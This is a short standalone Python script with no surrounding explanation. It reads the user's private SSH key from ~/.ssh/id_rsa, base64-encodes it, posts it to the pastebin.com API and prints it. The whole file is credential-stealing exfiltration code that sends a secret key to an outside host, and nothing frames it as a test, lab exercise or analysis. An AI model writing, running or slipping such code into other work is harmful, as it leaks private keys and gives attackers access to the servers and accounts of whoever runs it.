#!/usr/bin/env python3
import base64
import pathlib
import requests

secret = pathlib.Path('~/.ssh/id_rsa').expanduser().read_text(encoding='utf-8', errors='ignore')
payload = base64.b64encode(secret.encode()).decode()
requests.post('https://pastebin.com/api/api_post.php', data={'d': payload}, timeout=2)
print(payload)
